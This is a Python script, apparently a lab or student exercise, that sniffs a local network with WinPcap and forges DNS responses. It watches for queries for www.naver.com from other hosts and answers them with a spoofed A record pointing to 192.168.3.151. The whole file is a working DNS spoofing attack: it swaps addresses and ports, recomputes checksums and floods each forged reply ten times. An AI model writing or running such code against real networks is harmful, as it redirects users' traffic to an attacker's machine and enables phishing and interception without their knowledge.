from winpcapy import *
from dumpy import *
import struct

def makeCheckSum(data):
    size = len(data)
    if size % 2:
        data+= b'\x00'
        size += 1

    data = struct.unpack("!" + str(size // 2) + "H", data)
    chk = 0
    for x in data:
        chk += x
    chk = (chk >> 16) + (chk & 0xffff)
    chk = chk ^ 0xffff
    return chk

fakePacket = (c_ubyte * 89)()

pMacD = "00:10:f3:4e:58:40"
pMacD = pMacD.split(':')

pMacDlist = [0xff, 0xff, 0xff, 0xff, 0xff, 0xff]
for i in range(6):
    pMacDlist[i] = int(pMacD[i], 16)
            
packet = (c_ubyte * 42)()

device = get_device()
adhandle = pcap_open_live(device.name, 65526, 1, 1000, errbuf)

condition = 0
while True:        
    recv = pcap_next_ex(adhandle, byref(header), byref(pkt_data))
    data = pkt_data[0: header.contents.len]

    ethHeader = data[0: 14]
    ethHeader = bytes(ethHeader)
    ethHeader = struct.unpack(">6B6BH", ethHeader)

    if ethHeader[12] == 0x0800:
        condition = 1
        ipHeader = data[14: 34]
        ipHeader = bytes(ipHeader)
        ipHeader = struct.unpack(">BBHHBBBBH8B", ipHeader)

        ipDst = str(ipHeader[13]) + "." + str(ipHeader[14]) + "." + str(ipHeader[15]) + "." + str(ipHeader[16])
        ipSrc = str(ipHeader[9]) + "." + str(ipHeader[10]) + "." + str(ipHeader[11]) + "." + str(ipHeader[12])

        if ipSrc != "192.168.3.214" and ipDst != "192.168.3.214" and int(ipHeader[16]) != 255 and int(ipHeader[13]) < 224:
            condition = 1

            if ipHeader[7] == 17:
                condition = 1
                udpHeader = data[34: 42]
                udpHeader = bytes(udpHeader)
                udpHeader = struct.unpack(">HHHH", udpHeader)

                if udpHeader[1] == 53:
                    condition = 1
                    dnsHeaderLen = udpHeader[2] - 8
                    dnsHeader = data[42: 42 + dnsHeaderLen]
                    dnsHeader = bytes(dnsHeader)
                    dnsHeader = struct.unpack(">HHHHHH" + str(dnsHeaderLen - 12) + "s", dnsHeader)
                    dnsData = dnsHeader[6].decode()

                    i = 0
                    dnsDomainPart = []
                    dnsDomain = ""
                    while 1:
                        if ord(dnsData[i]) == 0:
                            break
                        
                        dnsDomainPart += [ord(dnsData[i])]
                        dnsDomain += dnsData[i + 1: i + ord(dnsData[i]) + 1] + "."
                        i += (ord(dnsData[i]) + 1)
                    dnsDomain = dnsDomain[0: -1]
                    if dnsDomain == "www.naver.com":
                        condition = 1

                    else:
                        condition = 0

                else:
                    condition = 0
                
            else:
                condition = 0

        else:
            condition = 0

    else:
        condition = 0

    if condition == 1:
        print("srcPort: " + str(udpHeader[0]))
        print("trxId: " + str(dnsHeader[0]))
        print(dnsData)
        print(dnsDomainPart)
        print(dnsDomain)

        #packetCopy
        fakePacket[0: len(data)] = data[0: ]

        #ipHeaderFix
        fakePacket[0: 6] = data[6: 12]
        fakePacket[6: 12] = data[0: 6]

        fakePacket[14] = data[14]

        #ipHeaderFix
        fakePacket[26: 30] = data[30: 34]
        fakePacket[30: 34] = data[26: 30]

        fakePacket[16: 18] = 0, 75
        fakePacket[24: 26] = 0, 0

        #ipHeaderChkSumFix
        chk = makeCheckSum(bytes(fakePacket[14: 34]))
        fakePacket[24: 26] = (chk >> 8) & 0xff, chk & 0xff
        
        #udpHeaderFix
        fakePacket[34: 36] = data[36: 38]
        fakePacket[36: 38] = data[34: 36]

        fakePacket[38: 40] = 0, 55

        fakePacket[40: 42] = 0, 0

        #dnsHeaderFix
        count = len(data)
        
        fakePacket[count: count + 2] = 0xc0, 0x0c
        count += 2
        
        fakePacket[count: count + 2] = 0, 1
        count += 2

        fakePacket[count: count + 2] = 0, 1
        count += 2

        fakePacket[count: count + 4] = 0, 0, 0, 255
        count += 4

        fakePacket[count: count + 2] = 0, 4
        count += 2

        fakePacket[count: count + 4] = 192, 168, 3, 151
        count += 4

        print(count)

        i = 0
        while i < 10:
            pcap_sendpacket(adhandle, fakePacket, 89)
            i += 1
        
    else:
        pass
        
pcap_close(adhandle)
